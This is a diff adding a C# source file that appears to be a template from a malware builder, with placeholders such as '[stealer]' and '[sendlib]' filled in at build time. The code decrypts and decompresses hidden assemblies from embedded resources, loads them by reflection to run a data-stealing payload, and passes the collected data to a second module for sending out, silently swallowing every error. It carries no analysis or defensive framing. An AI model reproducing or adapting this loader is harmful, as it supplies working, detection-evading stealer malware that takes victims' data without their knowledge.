@@ -1,0 +1,83 @@
+using System;
+using System.IO;
+
+namespace TRONRANDOM_NAME
+{
+    internal class TRONRANDOM_CLASS
+    {
+
+        public static object TRONRANDOM_Start()
+        {
+            try
+            {
+                Type TRON_s19 = System.Reflection.Assembly.Load(TRON_decrypt("[stealer]".Split(':')[0], TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_decompress(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_loadassembly("[stealer]".Split(':')[1])))).GetType("[trname].[trclass]");
+
+                object TRON_s20 = Activator.CreateInstance(TRON_s19);
+                System.Reflection.MethodInfo TRON_s21 = TRON_s19.GetMethod("[trstart]");
+                object res = TRON_s21.Invoke(TRON_s20, null);
+                return res;
+
+            }
+            catch
+            {   }
+
+            return null;
+        }
+
+        public static object TRONRANDOM_SEND(object TRON_data)
+        {
+            try
+            {
+                Type TRON_s19 = System.Reflection.Assembly.Load(TRON_decrypt("[sendlib]".Split(':')[0], TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_decompress(TRONRANDOM_NAME.TRONRANDOM_CLASS.TRON_loadassembly("[sendlib]".Split(':')[1])))).GetType("[trname].[trclass]"); ;
+
+                object TRON_s20 = Activator.CreateInstance(TRON_s19);
+                System.Reflection.MethodInfo TRON_s21 = TRON_s19.GetMethod("[trstart]");
+                TRON_s21.Invoke(TRON_s20, new object[] { TRON_data });
+            }
+            catch 
+            {   }
+
+            return null;
+        }
+
+
+        static byte[] TRON_loadassembly(string TRON_s8)
+        {
+            using (Stream TRON_s7 = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(TRON_s8))
+            {
+                byte[] TRON_s6 = new byte[TRON_s7.Length];
+                TRON_s7.Read(TRON_s6, 0, TRON_s6.Length);
+                return TRON_s6;
+            }
+        }
+
+        static byte[] TRON_decompress(byte[] TRON_s10)
+        {
+            using (MemoryStream TRON_s12 = new MemoryStream(TRON_s10))
+            {
+                byte[] TRON_s13 = new byte[4];
+                TRON_s12.Read(TRON_s13, 0, 4);
+                int TRON_s11 = BitConverter.ToInt32(TRON_s13, 0);
+                using (System.IO.Compression.GZipStream TRON_s8 = new System.IO.Compression.GZipStream(TRON_s12,
+                    System.IO.Compression.CompressionMode.Decompress))
+                {
+                    byte[] result = new byte[TRON_s11];
+                    TRON_s8.Read(result, 0, TRON_s11);
+                    return result;
+                }
+            }
+        }
+
+        static byte[] TRON_decrypt(string TRON_s7, byte[] TRON_s8)
+        {
+            System.Security.Cryptography.SymmetricAlgorithm TRON_s9 = System.Security.Cryptography.Rijndael.Create();
+            System.Security.Cryptography.ICryptoTransform TRON_s10 = TRON_s9.CreateDecryptor(new System.Security.Cryptography.PasswordDeriveBytes(TRON_s7, null).GetBytes(16), new byte[16]);
+            MemoryStream TRON_s11 = new MemoryStream();
+            System.Security.Cryptography.CryptoStream TRON_s12 = new System.Security.Cryptography.CryptoStream(TRON_s11, TRON_s10, System.Security.Cryptography.CryptoStreamMode.Write);
+            TRON_s12.Write(TRON_s8, 0, TRON_s8.Length);
+            TRON_s12.FlushFinalBlock();
+            return TRON_s11.ToArray();
+
+        }
+    }
+}
